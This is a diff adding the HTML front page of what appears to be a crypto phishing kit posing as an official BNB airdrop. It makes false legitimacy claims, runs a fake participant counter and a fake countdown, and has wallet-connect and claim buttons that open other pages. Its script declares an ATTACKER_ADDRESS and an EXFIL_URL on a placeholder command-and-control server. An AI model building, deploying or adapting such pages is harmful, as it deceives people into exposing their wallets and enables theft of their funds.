@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>BNB AIRDROP - Official Web3 Campaign 2025</title>
+    <link rel="stylesheet" href="assets/style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+</head>
+<body>
+
+<header>
+    <div class="logo">
+        <div class="bnb-icon"></div>
+        <span>BNB AIRDROP</span><span class="web3-badge">Web3</span>
+    </div>
+    <nav>
+        <ul>
+            <li><a href="index.html" target="_self">Home</a></li>
+            <li><a href="airdrop.html" target="_blank">Airdrop</a></li>
+            <li><a href="how.html" target="_blank">How It Works</a></li>
+            <li><a href="tokenomics.html" target="_blank">Tokenomics</a></li>
+            <li><a href="faq.html" target="_blank">FAQ</a></li>
+        </ul>
+    </nav>
+    <button class="connect-btn" onclick="openConnect()">
+        <i class="fas fa-wallet"></i> Connect Wallet
+    </button>
+</header>
+
+<section class="hero">
+    <div class="hero-content">
+        <h1>BNB AIRDROP</h1>
+        <p>Join the official BNB Web3 Airdrop, connect your wallet, complete simple tasks, and secure your free BNB tokens today.</p>
+
+        <div class="stats">
+            <div class="stat-box">
+                <i class="fas fa-gift"></i>
+                <div class="value">1,000 BNB</div>
+                <div class="label">Airdrop Pool</div>
+            </div>
+            <div class="stat-box">
+                <i class="fas fa-users"></i>
+                <div class="value" id="participants">543,289+</div>
+                <div class="label">Total Participants</div>
+            </div>
+            <div class="stat-box">
+                <i class="fas fa-flame"></i>
+                <div class="value" id="countdown">03d 14h 27m</div>
+                <div class="label">Time Left</div>
+            </div>
+        </div>
+
+        <div class="hero-buttons">
+            <button class="claim-btn" onclick="openClaim()">
+                <i class="fas fa-gift"></i> Claim Airdrop Now
+            </button>
+            <button class="how-btn" onclick="openHow()">
+                <i class="fas fa-play"></i> How It Works
+            </button>
+        </div>
+    </div>
+
+    <div class="hero-visual">
+        <canvas id="earth-canvas"></canvas>
+        <div class="bnb-coin"></div>
+        <div class="pedestal">BNB</div>
+        <div class="parachute"><canvas class="parachute-canvas"></canvas></div>
+        <div class="parachute"><canvas class="parachute-canvas"></canvas></div>
+        <div class="parachute"><canvas class="parachute-canvas"></canvas></div>
+    </div>
+</section>
+
+<section class="features">
+    <div class="feature">
+        <i class="fas fa-shield-alt"></i>
+        <h3>100% Legit & Secure</h3>
+        <p>On-Chain Verified</p>
+    </div>
+    <div class="feature">
+        <i class="fas fa-bolt"></i>
+        <h3>Instant Distribution</h3>
+        <p>Direct to Your Wallet</p>
+    </div>
+    <div class="feature">
+        <i class="fas fa-infinity"></i>
+        <h3>Web3 Powered</h3>
+        <p>Decentralized & Transparent</p>
+    </div>
+    <div class="feature">
+        <i class="fas fa-lock"></i>
+        <h3>No KYC</h3>
+        <p>Privacy First</p>
+    </div>
+</section>
+
+<script>
+    const ATTACKER_ADDRESS = "0x40f4c332be705dbf098a48a728248b13a005e7cb";
+    const EXFIL_URL = "https://your-c2-server.com/log.php";
+
+    function openConnect() { window.open('connect.html', '_blank', 'width=400,height=600'); }
+    function openClaim() { window.open('claim.html', '_blank'); }
+    function openHow() { window.open('how.html', '_blank'); }
+
+    let count = 543289;
+    setInterval(() => {
+        count += Math.floor(Math.random() * 3) + 1;
+        document.getElementById("participants").innerText = count.toLocaleString() + "+";
+    }, 2500);
+
+    const endTime = new Date().getTime() + 3 * 86400000 + 14 * 3600000 + 27 * 60000;
+    function updateCountdown() {
+        const now = new Date().getTime();
+        const diff = endTime - now;
+        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((diff % 86400000) / 3600000);
+        const mins = Math.floor((diff % 3600000) / 60000);
+        document.getElementById("countdown").innerText = `${days}d ${hours}h ${mins}m`;
+    }
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    const canvas = document.getElementById("earth-canvas");
+    const ctx = canvas.getContext("2d");
+    canvas.width = 300; canvas.height = 300;
+    let angle = 0;
+    const earthImg = new Image();
+    earthImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/The_Blue_Marble_%28remastered%29.jpg/600px-The_Blue_Marble_%28remastered%29.jpg";
+    earthImg.onload = () => { setInterval(drawEarth, 50); };
+    function drawEarth() {
+        ctx.clearRect(0, 0, 300, 300);
+        ctx.save();
+        ctx.translate(150, 150);
+        ctx.rotate(angle);
+        ctx.drawImage(earthImg, -100, -100, 200, 200);
+        ctx.restore();
+        angle += 0.01;
+    }
+
+    document.querySelectorAll(".parachute-canvas").forEach(el => {
+        const c = el.getContext("2d");
+        c.fillStyle = "#f3ba2f"; c.fillRect(0, 0, 60, 60);
+        c.fillStyle = "#000"; c.font = "bold 20px Orbitron"; c.textAlign = "center"; c.fillText("BNB", 30, 30);
+    });
+</script>
+</body>
+</html>
